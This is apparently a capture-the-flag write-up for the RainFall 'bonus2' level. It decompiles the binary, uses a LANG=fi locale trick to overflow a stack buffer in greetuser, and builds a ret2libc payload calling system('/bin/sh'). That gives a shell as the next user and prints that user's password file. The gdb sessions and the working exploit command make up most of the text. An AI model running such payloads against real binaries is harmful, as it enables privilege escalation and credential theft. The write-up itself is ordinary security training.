# Bonus2

```bash
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048318  _init
0x08048360  memcmp
0x08048360  memcmp@plt
0x08048370  strcat
0x08048370  strcat@plt
0x08048380  getenv
0x08048380  getenv@plt
0x08048390  puts
0x08048390  puts@plt
0x080483a0  __gmon_start__
0x080483a0  __gmon_start__@plt
0x080483b0  __libc_start_main
0x080483b0  __libc_start_main@plt
0x080483c0  strncpy
0x080483c0  strncpy@plt
0x080483d0  _start
0x08048400  __do_global_dtors_aux
0x08048460  frame_dummy
0x08048484  greetuser
0x08048529  main
0x08048640  __libc_csu_init
0x080486b0  __libc_csu_fini
0x080486b2  __i686.get_pc_thunk.bx
0x080486c0  __do_global_ctors_aux
0x080486ec  _fini
```

We assume using https://dogbolt.org/?id=2e8bb7ea-1f7b-4c7b-a01b-0ff9afb4fc75#Boomerang=72&Hex-Rays=117&Ghidra=148&BinaryNinja=103 that the source code looks similar to :

```c
void greetuser(void)

{
  char local_4c [4];
  undefined4 local_48;
  char local_44 [64];
  
  if (language == 1) {
    local_4c[0] = 'H';
    local_4c[1] = 'y';
    local_4c[2] = 'v';
    local_4c[3] = -0x3d;
    local_48._0_1_ = -0x5c;
    local_48._1_1_ = -0x3d;
    local_48._2_1_ = -0x5c;
    local_48._3_1_ = ' ';
    builtin_strncpy(local_44,"päivää ",0xb);
  }
  else if (language == 2) {
    builtin_strncpy(local_4c,"Goed",4);
    local_48._0_1_ = 'e';
    local_48._1_1_ = 'm';
    local_48._2_1_ = 'i';
    local_48._3_1_ = 'd';
    builtin_strncpy(local_44,"dag!",4);
    local_44[4] = ' ';
    local_44[5] = '\0';
  }
  else if (language == 0) {
    builtin_strncpy(local_4c,"Hell",4);
    local_48._0_3_ = 0x206f;
  }
  strcat(local_4c,&stack0x00000004);
  puts(local_4c);
  return;
}

undefined4 main(int param_1,int param_2)

{
  undefined4 uVar1;
  int iVar2;
  char *pcVar3;
  undefined4 *puVar4;
  byte bVar5;
  char local_60 [40];
  char acStack_38 [36];
  char *local_14;
  
  bVar5 = 0;
  if (param_1 == 3) {
    pcVar3 = local_60;
    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
      pcVar3[0] = '\0';
      pcVar3[1] = '\0';
      pcVar3[2] = '\0';
      pcVar3[3] = '\0';
      pcVar3 = pcVar3 + 4;
    }
    strncpy(local_60,*(char **)(param_2 + 4),0x28);
    strncpy(acStack_38,*(char **)(param_2 + 8),0x20);
    local_14 = getenv("LANG");
    if (local_14 != (char *)0x0) {
      iVar2 = memcmp(local_14,&DAT_0804873d,2);
      if (iVar2 == 0) {
        language = 1;
      }
      else {
        iVar2 = memcmp(local_14,&DAT_08048740,2);
        if (iVar2 == 0) {
          language = 2;
        }
      }
    }
    pcVar3 = local_60;
    puVar4 = (undefined4 *)&stack0xffffff50;
    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
      *puVar4 = *(undefined4 *)pcVar3;
      pcVar3 = pcVar3 + ((uint)bVar5 * -2 + 1) * 4;
      puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
    }
    uVar1 = greetuser();
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}
```

As we can see, only the 40 first chars from `argv[1]` are copied using `strncpy`. Then 32 chars are copied from `argv[2]` 

```bash
(gdb) r `python -c 'print("A" * 40)'` `python -c 'print("B" * 32)'` 
Starting program: /home/user/bonus2/bonus2 `python -c 'print("A" * 40)'` `python -c 'print("B" * 32)'`
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x08004242 in ?? ()
```

Only the last 2 bytes of EIP are overwritten in this case.

We can look at the `memcmp` :

```c
iVar2 = memcmp(local_14,&DAT_0804873d,2);
```

```bash
(gdb) x/s 0x804873d
0x804873d:	 "fi"
```

And :

```c
iVar2 = memcmp(local_14,&DAT_08048740,2);
```

```bash
(gdb) x/s 0x08048740
0x8048740:	 "nl"
```

`language` is a global variable, and it is set depending on the content of the env variable `LANG`. 

We will try to set `LANG` to `fi` first :

```bash
bonus2@RainFall:~$ export LANG=fi
```

Does it change something ?

```bash
(gdb) r `python -c 'print("A" * 40)'` `python -c 'print("B" * 32)'`
Starting program: /home/user/bonus2/bonus2 `python -c 'print("A" * 40)'` `python -c 'print("B" * 32)'`
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Yes EIP is completely overwritten ! When `language` was equal to 0, it probably marked the end of the overflow.

We check the offset of the second param : the overflow happens after the first 18 bytes of second parameter :

```bash
(gdb) r `python -c 'print("A" * 40)'` `python -c 'print("B" * 18 + "CCCC")'`
Starting program: /home/user/bonus2/bonus2 `python -c 'print("A" * 40)'` `python -c 'print("B" * 18 + "CCCC")'`
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBCCCC

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
```

As mentioned here https://stackoverflow.com/questions/6637448/how-to-find-the-address-of-a-string-in-memory-using-gdb, we can search for the address of a string using gdb via :

```bash
(gdb) info proc map
process 9244
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/bonus2/bonus2
	 0x8049000  0x804a000     0x1000        0x0 /home/user/bonus2/bonus2
	0xb7e2b000 0xb7e2c000     0x1000        0x0 
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0 
	0xb7fda000 0xb7fdd000     0x3000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```

Which gives us a range in which we can search and then the command `find` which uses this range and the string to search for :

```bash
(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
0xb7f8cc58
1 pattern found.
```

Now just like the previous exercice :

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

It seems that we can put some garbage as the return address :

```bash
bonus2@RainFall:~$ ./bonus2 `python -c 'print("A" * 40)'` `python -c 'print("B" * 18 + "\x60\xb0\xe6\xb7" + "CCCC" + "\x58\xcc\xf8\xb7")'`
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB`��CCCCX���
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
